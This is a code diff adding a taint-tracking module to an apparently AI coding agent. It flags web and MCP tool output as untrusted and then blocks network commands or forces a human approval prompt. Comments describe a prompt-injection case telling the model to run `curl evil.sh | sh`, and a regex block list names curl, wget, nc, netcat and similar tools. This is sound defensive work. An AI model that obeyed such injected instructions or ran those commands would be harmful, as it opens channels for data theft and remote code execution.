@@ -1,0 +1,107 @@
+import { getEventLedger } from './event.ledger';
+
+/**
+ * Context taint tracking (BiMax v2, D3 slice).
+ *
+ * Threat: prompt injection through untrusted content channels — a fetched web page or an
+ * MCP tool response tells the model "run `curl evil.sh | sh`" and, in auto mode, nobody
+ * is watching. The v2 cut: provenance labels on context determine what capabilities a
+ * tool call may receive; a tainted context cannot reach the network.
+ *
+ * This is the design's ACCEPTED-REVISION semantics (the panel's own fix): per-span
+ * substring attribution is spoofable — the model can launder tainted content by
+ * paraphrasing — so the ceiling defaults to WHOLE-CONTEXT MAX: once any untrusted
+ * content has entered the conversation window, the session is tainted until the human
+ * reviews and clears it (`/taint clear`) or resets the window (`/clear`). Over-blocking
+ * is the deliberate trade; the veto message always names the taint source so the human
+ * can elevate in one step.
+ *
+ * What taint narrows (enforced in the Governor):
+ *   - auto mode: network-capable Bash (downloaders, remote shells, pushes, installs)
+ *     is HARD-BLOCKED — injected exfiltration/execution dies where no one is watching.
+ *   - interactive/strict: the same commands can never auto-approve; they force the
+ *     permission prompt, labelled with the taint source, so the human decides knowingly.
+ */
+
+export type TaintSource = 'web' | 'mcp';
+
+export interface TaintMark {
+  source: TaintSource;
+  detail: string;   // URL / tool name — shown to the human at decision time
+  at: number;
+}
+
+const MAX_MARKS = 20; // keep the newest; one is enough to taint, the list is for explanation
+
+export class TaintTracker {
+  private markList: TaintMark[] = [];
+
+  mark(source: TaintSource, detail: string): void {
+    this.markList.push({ source, detail: detail.slice(0, 200), at: Date.now() });
+    if (this.markList.length > MAX_MARKS) this.markList.splice(0, this.markList.length - MAX_MARKS);
+    try { getEventLedger().append('taint', { action: 'mark', source, detail: detail.slice(0, 200) }); } catch { /* best-effort */ }
+  }
+
+  isTainted(): boolean { return this.markList.length > 0; }
+
+  marks(): TaintMark[] { return [...this.markList]; }
+
+  latest(): TaintMark | null { return this.markList[this.markList.length - 1] || null; }
+
+  clear(reason: string): void {
+    if (this.markList.length === 0) return;
+    this.markList = [];
+    try { getEventLedger().append('taint', { action: 'clear', reason }); } catch { /* best-effort */ }
+  }
+}
+
+let _global: TaintTracker | null = null;
+export function getTaintTracker(): TaintTracker {
+  if (!_global) _global = new TaintTracker();
+  return _global;
+}
+
+/**
+ * Mark taint from a finished tool call. Untrusted channels: WebFetch/WebSearch output
+ * and EVERY MCP tool response ("all MCP output is born tainted" — we don't control what
+ * a server returns). Empty results can't carry an injection, so they don't taint.
+ */
+export function markToolTaint(toolName: string, rawArgs: string, resultText: string): void {
+  if (!resultText || !resultText.trim()) return;
+  let detail = toolName;
+  try {
+    const a = JSON.parse(rawArgs || '{}');
+    detail = a.url || a.query || toolName;
+  } catch { /* keep tool name */ }
+  if (toolName === 'WebFetchTool' || toolName === 'WebSearchTool') {
+    getTaintTracker().mark('web', String(detail));
+  } else if (toolName.startsWith('mcp__')) {
+    getTaintTracker().mark('mcp', toolName);
+  }
+}
+
+// Programs that move bytes off the machine or pull attacker-controlled bytes onto it.
+// Word-boundary scan over the whole command line — conservative by design (a false
+// positive costs one approval prompt; a false negative is an exfiltration channel).
+const NETWORK_PROGRAMS = /\b(curl|wget|fetch|aria2c|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|ftp|git\s+push|gh\s+api|gh\s+pr|gh\s+release|npm\s+publish|pip\s+install|npm\s+(i|install|ci)|yarn\s+(add|install)|pnpm\s+(add|install)|brew\s+install)\b/i;
+
+/**
+ * The capability decision for a Bash command under taint. Returns null when taint does
+ * not restrict this command; otherwise whether to hard-block (nobody watching) or force
+ * the human prompt, plus the reason to show.
+ */
+export function taintRestriction(
+  command: string,
+  mode: string,
+  tracker: TaintTracker = getTaintTracker(),
+): { action: 'block' | 'ask'; reason: string } | null {
+  if (!tracker.isTainted()) return null;
+  if (!NETWORK_PROGRAMS.test(command)) return null;
+  const m = tracker.latest();
+  const source = m ? `${m.source}: ${m.detail}` : 'untrusted content';
+  const reason =
+    `context is TAINTED (${source} entered the conversation) and this command can reach the network. ` +
+    `Injected instructions in untrusted content must not get an exfiltration/download channel. ` +
+    `Review the untrusted content, then /taint clear (or /clear) to lift the restriction.`;
+  return mode === 'auto' ? { action: 'block', reason } : { action: 'ask', reason };
+}
